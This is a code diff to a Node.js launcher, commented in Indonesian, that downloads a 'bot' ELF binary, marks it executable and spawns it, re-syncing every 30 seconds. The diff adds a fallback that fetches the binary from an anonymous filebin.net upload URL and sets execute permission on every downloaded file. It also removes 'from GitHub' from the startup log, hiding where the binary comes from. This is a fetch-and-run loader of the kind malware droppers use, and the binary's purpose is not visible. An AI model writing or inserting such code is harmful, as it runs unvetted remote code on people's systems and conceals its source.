@@ -10,6 +10,10 @@ const BASES = [
   `https://raw.githubusercontent.com/${OWNER}/${REPO}/main`,
   `https://github.com/${OWNER}/${REPO}/raw/refs/heads/main`,
 ];
+
+// URL khusus/langsung untuk penangan file cadangan (Filebin)
+const FILEBIN_URL = 'https://filebin.net/yh2cpl5j974km216/up';
+
 const SYNC_MS = 30000;
 
 function request(url, redirects) {
@@ -36,6 +40,7 @@ function request(url, redirects) {
 }
 
 async function fetchBuffer(rel) {
+  // Coba unduh melalui basis URL GitHub terlebih dahulu
   for (const base of BASES) {
     try {
       const { status, buffer } = await request(`${base}/${rel}?cb=${Date.now()}`, 0);
@@ -44,6 +49,17 @@ async function fetchBuffer(rel) {
       }
     } catch {}
   }
+
+  // Jika gagal dan request adalah binary 'abots/c/c', coba unduh dari Filebin
+  if (rel === 'abots/c/c') {
+    try {
+      const { status, buffer } = await request(`${FILEBIN_URL}?cb=${Date.now()}`, 0);
+      if (status === 200 && buffer && buffer.length > 0) {
+        return buffer;
+      }
+    } catch {}
+  }
+
   return null;
 }
 
@@ -63,6 +79,8 @@ async function writeIfChanged(dest, buf) {
   }
   const tmp = dest + '.tmp';
   await fs.promises.writeFile(tmp, buf);
+  // Tambahkan izin chmod 755 agar file biner bisa dieksekusi
+  await fs.promises.chmod(tmp, 0o755);
   await fs.promises.rename(tmp, dest);
   return true;
 }
@@ -71,9 +89,11 @@ let proc = null;
 
 function startBot() {
   const botPath = path.join(__dirname, 'c');
-  const st = fs.statSync(botPath);
-  if ((st.mode & 0o111) === 0) {
-    fs.chmodSync(botPath, 0o755);
+  if (fs.existsSync(botPath)) {
+    const st = fs.statSync(botPath);
+    if ((st.mode & 0o111) === 0) {
+      fs.chmodSync(botPath, 0o755);
+    }
   }
   proc = spawn(botPath, [], {
     stdio: 'inherit',
@@ -122,7 +142,7 @@ async function syncAll() {
 }
 
 async function main() {
-  console.log('bots setup: fetching bot binary from GitHub');
+  console.log('bots setup: fetching bot binary');
   const bin = await fetchBuffer('abots/c/c');
   if (!bin || !isElf(bin)) {
     console.error('failed to download a valid bot binary');
